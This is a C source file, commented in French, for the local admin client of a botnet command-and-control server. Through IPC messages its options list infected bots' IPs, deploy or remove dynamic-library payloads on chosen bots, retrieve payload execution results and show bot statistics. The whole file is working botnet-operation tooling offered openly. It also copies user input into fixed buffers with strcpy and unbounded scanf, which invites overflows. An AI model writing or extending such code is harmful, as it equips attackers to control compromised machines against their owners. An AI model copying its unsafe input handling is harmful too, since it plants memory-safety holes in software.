/* Local administration of the C&C

- Communication via Inter Process Communication (IPC) using Message Passing method.
- admin send a type 1 request and then wait for a type 3 answer to stop itself.
- on the other side the C&C send a series of type 2 messages.
To end the communication it finally send a type 3 message.

Options :

-c get C&C's Id
-l List botnets' IP
-d <charge> <bot> start a charge on a bot (charge = dynamic library)
-e <charge> <bot> remove a charge
-r <index> <bot> get the result of a charge's execution
-i list the dynamic libraries that was uploaded on the C&C
-s <ip> print botnet's statistics
-q <ip> quit the TCP communication with the bot
-h return admin.c's documentation

For example, launch	: $ ./admin
Or : $ ./admin -e charge.so 127.0.0.1
*/
#include "libipc.h"

#define TAILLE_DOCUMENTATION 1500
#define CLE_MSG (key_t)1000


/* Intercepte CTRL + C : detruit file de message IPC */
void handler(int SignalNum)
{
    if(SignalNum==SIGINT){
        printf("\nInterruption SIGINT\n");

        detruit_file_msg(CLE_MSG);

		printf("Destruction file de message IPC : ok\n");
        exit(0);
    }
}


int main(int argc, char const *argv[]) {
    /* gestionnaire de signal */
    struct sigaction prepaSignal;
    prepaSignal.sa_handler=&handler;
    prepaSignal.sa_flags=0;
    sigemptyset(&prepaSignal.sa_mask);
    sigaction(SIGINT,&prepaSignal,0);

    char doc[TAILLE_DOCUMENTATION]="";
    char nom_charge[TAILLE_MSG];
    char ip_bot[TAILLE_MSG];
    char index_exec[TAILLE_MSG];
    char choix_u[3]="";
    char choix=0;
    char c;
    bool demande_info=false;

    strcat(doc,"Administration locale du c&c\n\n");
    strcat(doc,"-c Id du c&c\n");
    strcat(doc,"-l Lister les ip de tout les bot infectes\n");
    strcat(doc,"-d <charge> <bot> Demarrer une charge sur un bot\n");
    strcat(doc,"-e <charge> <bot> Effacer une charge presente sur un bot\n");
    strcat(doc,"-r <index> <bot> Recevoir le resultat de l'execution d'une charge\n");
    strcat(doc,"-s <ip> Affiche les stats du bot\n");
    strcat(doc,"-q <ip> Quitte la communication TCP avec le bot\n");
    strcat(doc,"-i Lister les charges a disposition du C&C\n");
    strcat(doc,"-h Voir la doc de : admin.c\n");
    strcat(doc,"\nPar exemple, lancer\t $ ./admin\n");
    strcat(doc,"Ou bien\t\t\t $ ./admin -e charge.so 127.0.0.1\n");
    strcat(doc,"\nPuis laissez-vous guider\n");

    /* Gestion des arguments */
    if(argc==4 && strncmp(argv[1],"-d",2)==0){// -d <charge> <bot>
        strcpy(nom_charge,argv[2]);
        strcpy(ip_bot,argv[3]);
        choix=4;
    }
    else if(argc==4 && strncmp(argv[1],"-e",2)==0){// -e <charge> <bot>
        strcpy(nom_charge,argv[2]);
        strcpy(ip_bot,argv[3]);
        choix=5;
    }
    else if(argc==4 && strncmp(argv[1],"-r",2)==0){// -r <index> <bot>
        strcpy(index_exec,argv[2]);
        strcpy(ip_bot,argv[3]);
        choix=7;
    }
    else if(argc==3 && strncmp(argv[1],"-s",2)==0){// -s <ip>
        strcpy(ip_bot,argv[2]);
        choix=8;
    }
    else if(argc==3 && strncmp(argv[1],"-q",2)==0){// -q <ip>
        strcpy(ip_bot,argv[2]);
        choix=9;
    }

    /* on a rentré un seul argument */
    else if (argc == 2 ){
        strcpy(choix_u, argv[1]);
        demande_info=true;
    }

    else{
        printf("%s\n",doc);
        printf("Que voulez-vous faire ?\nlettre : ");

        scanf("%c",&c);
        choix_u[0]='-';
        choix_u[1]=c;
        choix_u[2]='\0';

        demande_info=true;
    }

    if(demande_info==true){
        /* variable 'choix' qui va nous permettre d'executer les tâches que l'on veut */
        if (strcasecmp(choix_u,"-c") == 0) choix=1;
        else if (strcasecmp(choix_u,"-l") == 0) choix=2;
        else if (strcasecmp(choix_u,"-i") == 0) choix=3;

        else if ((strcasecmp(choix_u,"-s") == 0) || (strcasecmp(choix_u,"-q") == 0)){
            printf("ip du bot cible : \n");
            scanf("%s",ip_bot);

            if (strcasecmp(choix_u,"-s") == 0) choix=8;
            if (strcasecmp(choix_u,"-q") == 0) choix=9;
        }

        else if (strcasecmp(choix_u,"-r") == 0){
            printf("index du resultat d'execution de la charge : \n");
            scanf("%s",index_exec);
            printf("ip du bot cible : \n");
            scanf("%s",ip_bot);

            choix=7;
        }

        else if ((strcasecmp(choix_u,"-d") == 0) || (strcasecmp(choix_u,"-e") == 0)){
            printf("nom de la charge : \n");
            scanf("%s",nom_charge);
            printf("ip du bot cible : \n");
            scanf("%s",ip_bot);

            if (strcasecmp(choix_u,"-d") == 0) choix=4;
            if (strcasecmp(choix_u,"-e") == 0) choix=5;
        }

        else if (strcasecmp(choix_u,"-h") == 0){
            printf("%s",doc);
            return 0;
        }
        else{
            printf("Argument invalide... Veuillez vous referez a la doc :\n%s\n",doc);
            return 0;
        }

    }


    /* Envoie des messages au C&C */
    if(choix<1 || choix>9){
        printf("Erreur choix... %d\n",choix);
        return -1;
    }
    else{
        Msg_IPC_t message;
        if (construit_file_msg_ipc(CLE_MSG)== -1){
            printf("Erreur message IPC\n");
            return 0;
        }
        message.type = 1;

        switch (choix) {
            //case 1 -c Id du c&c
            case 1:
                printf("Id du \"command and control\"\n");
                strcpy(message.texte, "id");
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 2 -l Lister les ip de tout les bot infectes
            case 2:
                printf("Liste de tout les ip des bots\n");
                strcpy(message.texte, "ip");
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 3 -i Lister les charges à disposition du C&C
            case 3:
                printf("Liste des charges a disposition du C&C\n");
                strcpy(message.texte, "liste_charge_cc");
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 4 -d Demarrer une charge sur un bot
            case 4:
                printf("Demarrer une charge sur un bot\n");
                strcpy(message.texte, "demarrer");
                envoie_msg_ipc(CLE_MSG, message);


                strcpy(message.texte,nom_charge);
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,ip_bot);
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 5 -e Effacer une charge presente sur un bot
            case 5:
                printf("Effacer une charge presente sur un bot\n");
                strcpy(message.texte, "effacer");
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,nom_charge);
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,ip_bot);
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 7 -r Recevoir le resultat de l'execution d'une charge
            case 7:
                printf("Recevoir le resultat de l'execution d'une charge\n");
                strcpy(message.texte, "resultat");
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,index_exec);
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,ip_bot);
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 8 -s Affiche les stats du bot
            case 8:
                printf("Affiche les stats du bot\n");
                strcpy(message.texte, "stat");
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,ip_bot);
                envoie_msg_ipc(CLE_MSG, message);
                break;

            //case 9 -q Quitte la communication TCP avec le bot
            case 9:
                printf("Quitte la communication TCP avec le bot\n");
                strcpy(message.texte, "quit");
                envoie_msg_ipc(CLE_MSG, message);

                strcpy(message.texte,ip_bot);
                envoie_msg_ipc(CLE_MSG, message);
                break;
        }//fin du switch


        /* reception des messages IPC de la part du C&C */
        Msg_IPC_t message_recue;
        while (recoit_msg_ipc(CLE_MSG, 3, &message_recue) != 0){
            if (recoit_msg_ipc(CLE_MSG, 2, &message_recue) == 0){
                printf("texte : %s\n",message_recue.texte);
            }
        }//fin du while : on a recu un message de type 3 qui marque la fin de la communication

        /* fin de la communication IPC */
        printf("\n[admin] Fin de la communication\n");
        detruit_file_msg(CLE_MSG);
    }//fin du else

    return 0;
}
